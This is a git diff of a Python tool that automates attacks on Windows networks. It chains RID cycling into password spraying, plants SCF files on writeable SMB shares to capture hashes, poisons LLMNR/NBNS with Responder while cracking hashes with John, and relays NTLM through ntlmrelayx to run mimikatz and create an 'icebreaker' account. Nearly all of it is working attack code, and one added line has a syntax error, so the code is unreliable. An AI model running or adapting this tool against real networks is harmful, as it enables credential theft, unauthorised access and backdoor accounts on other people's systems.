@@ -30,7 +30,8 @@ def parse_args():
     parser.add_argument("-l", "--hostlist", help="Host list file")
     parser.add_argument("-x", "--xml", help="Path to Nmap XML file")
     parser.add_argument("-p", "--password-list", help="Path to password list file")
-    parser.add_argument("-s", "--skip", default='', help="Skip [ntlmrelayx/responder/ridenum/john]")
+    parser.add_argument("-s", "--skip", default='', help="Skip [rid/scf/responder/ntlmrelay/crack] where the first 4 options correspond to attacks 1-4")
+    parser.add_argument("-r", "--respondertime", default='10', help="Number of minutes to run the LLMNR/Responder attack; defaults to 10m")
     return parser.parse_args()
 
 def parse_nmap(args):
@@ -114,7 +115,7 @@ def run_smbclient(server, share_name, action, scf_filepath):
     smb_cmds_data = 'use {}\n{} {}\nls\nexit'.format(share_name, action, scf_filepath)
     write_to_file(smb_cmds_filename, smb_cmds_data, 'w+')
     smbclient_cmd = 'python2 submodules/impacket/examples/smbclient.py {} -f {}'.format(server, smb_cmds_filename)
-    print('[*] Running: {}'.format(smbclient_cmd))
+    print("[*] Running '{}' with the verb '{}'".format(smbclient_cmd, action))
     stdout, stderr = Popen(smbclient_cmd.split(), stdout=PIPE, stderr=PIPE).communicate()
     return stdout, stderr
 
@@ -132,6 +133,8 @@ def write_scf_files(lines, ip, args):
     Writes SCF files to writeable shares based on Nmap smb-enum-shares output
     '''
     share = None
+    anon_share_found = False
+    scf_filepath = create_scf()
 
     for l in lines:
         share = get_share(l, share)
@@ -140,16 +143,18 @@ def write_scf_files(lines, ip, args):
             if 'Anonymous access:' in l or 'Current user access:' in l:
                 access = l.split()[-1]
                 if access == 'READ/WRITE':
-                    scf_filepath = create_scf()
+                    anon_share_found = True
                     print('[+] Writeable share found at: '+share)
                     print('[*] Attempting to write SCF file to share')
                     action = 'put'
                     stdout, stderr = run_smbclient(ip, share_folder, action, scf_filepath)
-                    if os.path.basename(scf_filepath) in str(stdout):
+                    if 'Error:' not in str(stdout):
                         print('[+] Successfully wrote SCF file to: {}'.format(share))
                         write_to_file('logs/Shares-with-SCF.txt', share+'\n', 'a+')
-                    elif stderr != b'':
+                    else:
                         print('[-] Error writing SCF file: {}'.format(stderr))
+    
+    return anon_share_found
 
 def parse_nse(hosts, args):
     '''
@@ -159,7 +164,6 @@ def parse_nse(hosts, args):
 
     if 'scf' not in args.skip.lower():
         print('\n[*] Attack 2: SCF file upload to anonymously writeable shares for hash collection')
-
 
     for host in hosts:
         ip = host.address
@@ -174,8 +178,11 @@ def parse_nse(hosts, args):
             if 'scf' not in args.skip.lower():
                 if script_out['id'] == 'smb-enum-shares':
                     lines = script_out['output'].splitlines()
-                    write_scf_files(lines, ip, args)
+                    anon_share_found = write_scf_files(lines, ip, args)
                     local_scf_cleanup()
+
+                if anon_share_found == False:
+                    print('[-] No anonymously writeable shares found')
 
     if len(smb_signing_disabled_hosts) > 0:
         for host in smb_signing_disabled_hosts:
@@ -185,19 +192,19 @@ def local_scf_cleanup():
     '''
     Removes local SCF file and SMB commands file
     '''
-    try:
-        os.remove('@local.scf')
-    except:
-        pass
-
-    try:
-        os.remove('smb-cmds.txt')
-    except:
-        pass
-
     timestamp = str(time.time())
-    path = 'logs/shares-with-SCF.txt'
-    os.rename(path, path+'-'+timestamp)
+    scf_file = '@local.scf'
+    smb_cmds_file = 'smb-cmds.txt'
+    shares_file = 'logs/shares-with-SCF.txt'
+
+    if os.path.isfile(scf_file):
+        os.remove('@local.scf')
+
+    if os.path.isfile(smb_cmds_file):
+        os.remove('smb-cmds.txt')
+
+    if os.path.isfile(shares_file):
+        os.rename(shares_file, shares_file+'-'+timestamp)
 
 def get_hosts(args, report):
     '''
@@ -341,9 +348,11 @@ def write_to_file(filename, data, write_type):
 def create_brute_cmds(ip_users, passwords):
     '''
     Creates the bruteforce commands
+    ip_users = {ip:[user1,user2,user3]}
     '''
     already_tested = []
     cmds = []
+
     for ip in ip_users:
         for user in ip_users[ip]:
             if user not in already_tested:
@@ -357,7 +366,6 @@ def create_brute_cmds(ip_users, passwords):
                     cmd2 = "echo '{}' ".format(cmd)+cmd
                     cmds.append(cmd2)
 
-    print('[*] Checking the passwords {} and {} against the users'.format(passwords[0], passwords[1]))
     return cmds
 
 def create_passwords(args):
@@ -372,7 +380,8 @@ def create_passwords(args):
             passwords = [line.rstrip() for line in f]
     else:
         season_pw = create_season_pw()
-        other_pw = "P@ssw0rd"
+        #other_pw = "P@ssw0rd"
+        other_pw = "Qwerty1"
         passwords = [season_pw, other_pw]
 
     return passwords
@@ -406,28 +415,28 @@ def parse_brute_output(brute_output):
     '''
     Parse the chunk of rpcclient attempted logins
     '''
-    # {'ip':[userpw, userpw2]}
-    users_pws = {}
+    # prev_pwds = ['ip\user:password', 'dom\user:password']
+    prev_pwds = []
     pw_found = False
+
     for line in brute_output:
         # Missing second line of output means we have a hit
         if len(line.splitlines()) == 1:
             pw_found = True
             split = line.split()
             ip = split[1]
-            user_pw = split[5].replace('"','').replace('%',':')
-            if ip in users_pws:
-                users_pws[ip] += [user_pw]
-            else:
-                users_pws[ip] = [user_pw]
-            print('[!] Password found! {} on {}'.format(user_pw, ip))
+            dom_user_pwd = split[5].replace('"','').replace('%',':')
+            prev_pwds.append(dom_user_pwd)
+            host_dom_user_pwd = ip+': '+dom_user_pwd
+            print('[!] Password found! '+host_dom_user_pwd)
+            log_pwds([host_dom_user_pwd])
 
     if pw_found == False:
         print('[-] No password matches found')
 
-    return users_pws
+    return prev_pwds
 
-def smb_reverse_brute(loop, hosts, args):
+def smb_reverse_brute(loop, hosts, args, passwords):
     '''
     Performs SMB reverse brute
     '''
@@ -439,7 +448,7 @@ def smb_reverse_brute(loop, hosts, args):
     print('[*] Checking for null SMB sessions')
     print('[*] Example command that will run: '+dom_cmds[0].split('&& ')[1])
     rpc_output = async_get_outputs(loop, dom_cmds)
-    # We already printed that no sessions were found
+
     if rpc_output == None:
         print('[-] Error attempting to look up null SMB sessions')
         return
@@ -471,27 +480,25 @@ def smb_reverse_brute(loop, hosts, args):
 
     # {ip:username, username2], ip2:[username, username2]}
     ip_users = get_usernames(ridenum_output)
-    passwords = create_passwords(args)
 
     # Creates a list of unique commands which only tests
     # each username/password combo 2 times and not more
     brute_cmds = create_brute_cmds(ip_users, passwords)
+    print('[*] Checking the passwords {} and {} against the users'.format(passwords[0], passwords[1]))
     brute_output = async_get_outputs(loop, brute_cmds)
 
-    # users_pws = {'ip':[userpw, userpw2]}
     # Will always return at least an empty dict()
-    users_pws = parse_brute_output(brute_output)
-    return users_pws
+    prev_pwds = parse_brute_output(brute_output)
 
-def log_pwds(users_pws):
+    return prev_pwds
+
+def log_pwds(host_user_pwds):
     '''
     Turns SMB password data {ip:[usrr_pw, user2_pw]} into a string
     '''
-    for k in users_pws:
-        ip = k
-        for user_pw in users_pws[k]:
-            line = '{}: {}\n'.format(ip, user_pw)
-            write_to_file('found-passwords.txt', line, 'a+')
+    for host_user_pwd in host_user_pwds:
+        line = host_user_pwd+'\n'
+        write_to_file('found-passwords.txt', line, 'a+')
 
 def edit_responder_conf(switch, protocols):
     '''
@@ -573,6 +580,10 @@ def get_resp_hashes(prev_hashes):
             if ntlm_hash not in prev_hashes:
                 prev_hashes.append(ntlm_hash)
                 print('[!] Hash found! '+ f)
+
+                
+
+
                 if 'NTLMv1' in f:
                     if 'NTLMv1' in hashes:
                         hashes['NTLMv1'] += [ntlm_hash]
@@ -645,12 +656,11 @@ def get_cracked_pwds(prev_pwds):
                     user = line[0]
                     pw = line[1]
                     host = line[2]
-                    user_pw_str = user+':'+pw
-                    if user_pw_str not in prev_pwds:
-                        prev_pwds.append(user_pw_str)
-                        print('[!] Password found! {} on {}'.format(user_pw_str, host))
-                        user_pw = {host:[user_pw_str]}
-                        log_pwds(user_pw)
+                    host_user_pwd = host+'\\'+user+':'+pw
+                    if host_user_pwd not in prev_pwds:
+                        prev_pwds.append(host_user_pwd)
+                        print('[!] Password found! '+host_user_pwd)
+                        log_pwds([host_user_pwd])
     return prev_pwds
 
 def start_responder_llmnr():
@@ -708,18 +718,20 @@ def check_ntlmrelay_error(line, file_lines):
         return False
 
 def format_mimi_data(dom, user, auth, hash_or_pw, prev_hashes, prev_pwds):
-    user_pw = user+':'+auth
+    '''
+    Formats the collected mimikatz data and logs it
+    '''
+    dom_user_pw = dom+'\\'+user+':'+auth
     if hash_or_pw == 'Password':
-        if user_pw not in prev_pwds:
-            prev_pwds.append(user_pw)
-            # log_pwds requires format {ip:[user_pw, user_pw2]}
-            log_pwds({dom:[user_pw]})
-            print('[!] {} found! {}'.format(hash_or_pw, user_pw))
+        if dom_user_pw not in prev_pwds:
+            prev_pwds.append(dom_user_pw)
+            log_pwds([dom_user_pw])
+            print('[!] {} found! {}'.format(hash_or_pw, dom_user_pw))
     else:
-        if user_pw not in prev_hashes:
-            prev_hashes.append(user_pw)
-            log_pwds({dom:[user_pw]})
-            print('[!] {} found! {}'.format(hash_or_pw, user_pw))
+        if dom_user_pw not in prev_hashes:
+            prev_hashes.append(dom_user_pw)
+            log_pwds([dom_user_pw])
+            print('[!] {} found! {}'.format(hash_or_pw, dom_user_pw))
 
     return prev_pwds, prev_hashes
 
@@ -768,6 +780,7 @@ def get_and_crack_resp_hashes(args, prev_hashes, prev_pwds, prev_lines, identifi
     Avoids getting and cracking previous hashes
     '''
     new_lines = []
+
     if 'crack' not in args.skip.lower():
         prev_hashes, hashes = get_resp_hashes(prev_hashes)
         john_proc = crack_hashes(hashes, identifier)
@@ -781,9 +794,9 @@ def get_and_crack_resp_hashes(args, prev_hashes, prev_pwds, prev_lines, identifi
             for line in contents:
                 if line not in prev_lines:
                     new_lines.append(line)
-                    print('    [*] '+line.strip())
-    # We don't want a separate john proc for each hash so we wait 30s between checks
-    time.sleep(30)
+                    print('    [Responder] '+line.strip())
+    # We don't want a separate john proc for each hash so we wait 10s between checks
+    time.sleep(10)
 
     return prev_hashes, prev_pwds, new_lines
 
@@ -798,7 +811,7 @@ def cleanup_resp(resp_proc, prev_pwds):
     prev_pwds = get_cracked_pwds(prev_pwds)
     return prev_pwds
 
-def parse_ntlmrelay_line(identifier, line, successful_auth, prev_hashes, args):
+def parse_ntlmrelay_line(identifier, line, successful_auth, prev_hashes, prev_pwds, args):
     '''
     Parses ntlmrelayx.py's output
     '''
@@ -806,7 +819,7 @@ def parse_ntlmrelay_line(identifier, line, successful_auth, prev_hashes, args):
     # check for errors
     if line.startswith('  ') or line.startswith('Traceback') or line.startswith('ERROR'):
         # First few lines of mimikatz logo start with '   ' and have #### in them
-        if '####' not in line:
+        if '####' not in line and 'mimikatz_initOrClean ; coInitializeEx' not in line:
             print('    '+line.strip())
 
     # ntlmrelayx output
@@ -840,9 +853,12 @@ def parse_ntlmrelay_line(identifier, line, successful_auth, prev_hashes, args):
 
     if 'Executed specified command on host' in line:
         ip = line.split()[-1]
-        log_pwds({ip:['icebreaker:P@ssword123456']})
+        host_user_pwd = ip+'\\icebreaker:P@ssword123456'
+        prev_pwds.append(host_user_pwd)
+        print('[!] User created! '+host_user_pwd)
+        log_pwds([host_user_pwd])
 
-    return prev_hashes, successful_auth
+    return prev_hashes, prev_pwds, successful_auth
 
 def remote_scf_cleanup():
     '''
@@ -918,9 +934,11 @@ def do_ntlmrelay(identifier, prev_hashes, prev_pwds, args):
     successful_auth = False
     for line in file_lines:
         # Parse ntlmrelay output
-        prev_hashes, successful_auth = parse_ntlmrelay_line(identifier, line, successful_auth, prev_hashes, args)
+        prev_hashes, prev_pwds, successful_auth = parse_ntlmrelay_line(identifier, line, successful_auth, prev_hashes, prev_pwds, args)
+
         # Parse mimikatz output
-        prev_pwds, prev_hashes, mimi_data = parse_mimikatz(prev_pwds, prev_hashes, mimi_data, line)
+        if line.startswith('  .#####.   mimikatz ':
+            prev_pwds, prev_hashes, mimi_data = parse_mimikatz(prev_pwds, prev_hashes, mimi_data, line)
 
 def check_for_nse_scripts(hosts):
     '''
@@ -969,6 +987,8 @@ def main(report, args):
     prev_hashes = []
     prev_pwds = []
     loop = asyncio.get_event_loop()
+    passwords = create_passwords(args)
+    identifier = ''.join(random.choice(string.ascii_letters) for x in range(5))
 
     # Returns a list of Nmap object hosts
     # So you must use host.address, for example, to get the ip
@@ -986,28 +1006,24 @@ def main(report, args):
     
         # ATTACK 1: RID Cycling into reverse bruteforce
         if 'rid' not in args.skip.lower():
-            users_pws = smb_reverse_brute(loop, hosts, args)
-            if users_pws != None:
-                log_pwds(users_pws)
+            prev_pwds += smb_reverse_brute(loop, hosts, args, passwords)
 
         # ATTACK 2: SCF file upload to writeable shares
         parse_nse(hosts, args)
-
 
     else:
         print('[-] No hosts with port 445 open. \
                    Skipping all attacks except LLMNR/NBNS/mDNS poison attack with Responder.py')
 
     # ATTACK 3: LLMNR poisoning
-    identifier = ''.join(random.choice(string.ascii_letters) for x in range(5))
     if 'llmnr' not in args.skip.lower():
         print('\n[*] Attack 3: LLMNR/NBTS/mDNS poisoning for NTLM hashes')
         prev_lines = []
         resp_proc = start_responder_llmnr()
         time.sleep(2)
 
-        # Check for hashes for 10m
-        timeout = time.time() + 60 * 10
+        # Check for hashes for set amount of time
+        timeout = time.time() + 60 * int(args.respondertime)
         try:
             while time.time() < timeout:
                 prev_hashes, prev_pwds, new_lines = get_and_crack_resp_hashes(args, prev_hashes, prev_pwds, prev_lines, identifier)
